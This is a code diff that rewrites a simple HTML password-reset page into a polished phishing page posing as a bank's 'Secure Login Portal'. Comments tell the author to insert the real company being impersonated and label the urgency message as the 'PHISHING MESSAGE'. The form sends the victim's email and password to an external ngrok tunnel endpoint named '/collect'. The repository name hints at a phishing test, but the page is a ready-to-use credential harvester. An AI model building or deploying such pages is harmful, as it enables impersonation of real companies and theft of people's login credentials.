@@ -1,22 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Password Reset</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login Portal - YourBank Name</title> 
+    <!-- *** AUTHENTICITY NOTE: Change "YourBank Name" to the real company you are impersonating! *** -->
+    <style>
+        /* --- CORE STYLING FOR PROFESSIONAL LOOK --- */
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #e9ecef; /* Light grey background, common in enterprise sites */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15); /* Stronger, professional shadow */
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            border-top: 5px solid #007bff; /* Adding a "brand" accent color */
+        }
+        h1 { 
+            color: #333; 
+            margin-bottom: 5px; 
+            font-size: 1.8em;
+        }
+        .brand-tag { 
+            color: #007bff; 
+            font-size: 0.9em; 
+            display: block; 
+            margin-bottom: 20px;
+        }
+        p.alert { 
+            color: #d9534f; /* Red color for urgency/warning */
+            font-weight: bold; 
+            margin-bottom: 25px; 
+        }
+        .form-group { 
+            margin-bottom: 20px; 
+            text-align: left;
+        }
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: 600; 
+            color: #555; 
+        }
+        input[type="email"], input[type="password"] { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ccc; 
+            border-radius: 6px; 
+            box-sizing: border-box; /* Ensures padding doesn't increase total width */
+            transition: border-color 0.3s;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border-color: #007bff; /* Highlights field when clicked */
+            outline: none;
+        }
+        button[type="submit"] { 
+            background-color: #28a745; /* Green color for "Go/Success" feel */
+            color: white; 
+            padding: 14px; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 1.1em;
+            transition: background-color 0.3s;
+        }
+        button[type="submit"]:hover {
+            background-color: #218838; 
+        }
+    </style>
 </head>
 <body>
-<h2>Reset Your Password</h2>
-<p>We noticed unusual activity on your account. Please reset your password to secure your account.</p>
 
-<form action="https://github.com/helloworldoes2026-alt/phishingtest/blob/main/phishing.html" method="POST">
-<label for="email">Email:</label>
+    <div class="login-container">
+        <!-- BRANDING & URGENCY -->
+        <h1>Account Security Alert</h1>
+        <span class="brand-tag">YourBank Name</span>
 
-<input type="email" id="email" name="email" required>
+        <!-- PHISHING MESSAGE -->
+        <p class="alert">We detected multiple failed logins from an unknown device. Please verify your credentials below to restore full account access.</p>
 
-<label for="password">Password:</label>
+        <!-- THE SUBMISSION FORM -->
+        <form action="https://rounding-stoplight-improving.ngrok-free.dev/collect" method="POST">
 
-<input type="password" id="password" name="password" required>
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" name="email" required placeholder="Enter your primary email">
+            </div>
 
-<input type="submit" value="Reset Password">
-</form>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password">
+            </div>
+
+            <button type="submit">Verify & Secure Account</button>
+        </form>
+    </div>
+
 </body>
 </html>
